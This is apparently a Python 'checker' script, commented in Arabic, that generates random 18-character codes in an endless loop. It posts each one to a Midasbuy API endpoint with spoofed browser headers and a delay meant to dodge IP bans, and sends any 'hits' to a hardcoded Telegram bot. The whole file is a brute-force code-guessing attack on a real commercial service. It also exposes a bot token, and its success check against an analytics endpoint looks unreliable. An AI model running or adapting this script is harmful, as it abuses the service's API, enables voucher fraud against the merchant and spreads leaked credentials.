import os
import requests
import json
import random
import string
import time
from rich.console import Console
from pyfiglet import figlet_format
import telebot

# تنظيف الشاشة عند بدء التشغيل
os.system('clear' if os.name == 'posix' else 'cls')

console = Console()
console.print(figlet_format("Mustafa\nChecker", font="slant"), style="bold cyan")

# --- إضافة البيانات الخاصة بك هنا ---
telegram_bot_token = "6984532857:AAFn2-3uk3JPS_lWxVKuLxqqVw6v1vOW-Ys"
telegram_chat_id = "5803355350"
# ----------------------------------

try:
    bot = telebot.TeleBot(token=telegram_bot_token)
    # التحقق من صحة التوكن عند التشغيل
    bot.get_me()
    console.print(f"[bold green]✅ تم ربط البوت بنجاح![/bold green]")
except Exception as e:
    console.print(f"[bold red]❌ خطأ في توكن البوت: {e}[/bold red]")
    exit()

def generate_code():
    # توليد كود عشوائي بطول 18 حرف ورقم
    return ''.join(random.choices(string.ascii_letters + string.digits, k=18))

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Content-Type": "application/json",
    "Origin": "https://www.midasbuy.com",
    "Referer": "https://www.midasbuy.com/"
}

url = "https://pagedooapi.midasbuy.com/api/pagereport"

console.print(f"[bold yellow]📡 يتم الآن فحص الأكواد وإرسال الصيد إلى: {telegram_chat_id}[/bold yellow]\n")

while True:
    try:
        code = generate_code()
        
        payload = {
            "time": str(int(time.time() * 1000)),
            "page": {
                "page_id": "_empty_page2",
                "page_url": "https://www.midasbuy.com/act/pagedoo/Activity_1720681045_NGSBJX/pc/index.html"
            },
            "user_info": {
                "cookie_id": "gen_" + ''.join(random.choices(string.digits, k=20)),
                "app_id": "1450015065",
                "user_id": code
            },
            "event_code": "leave_page"
        }

        response = requests.post(url, headers=headers, json=payload, timeout=10)
        
        # ملاحظة: استجابة 200 تعني أن الطلب تم بنجاح
        if response.status_code == 200:
            # التحقق إذا كان الرد يحتوي على نتيجة إيجابية
            if "success" in response.text.lower():
                msg = f"✅ تم العثور على كود محتمل!\nالكود: {code}\nالمصدر: مصطفى عودة"
                console.print(f"[bold green]{msg}[/bold green]")
                bot.send_message(chat_id=telegram_chat_id, text=msg)
            else:
                console.print(f"[red]❌ غير صالح:[/red] {code}")
        else:
            console.print(f"[bold red]⚠️ خطأ سيرفر: {response.status_code}[/bold red]")

        # تأخير بسيط جداً لتجنب الحظر السريع للـ IP
        time.sleep(1)

    except requests.exceptions.RequestException as e:
        console.print(f"[bold red]📡 مشكلة في الاتصال بالإنترنت...[/bold red]")
        time.sleep(5)
    except Exception as e:
        console.print(f"[bold red]❌ خطأ غير متوقع: {e}[/bold red]")
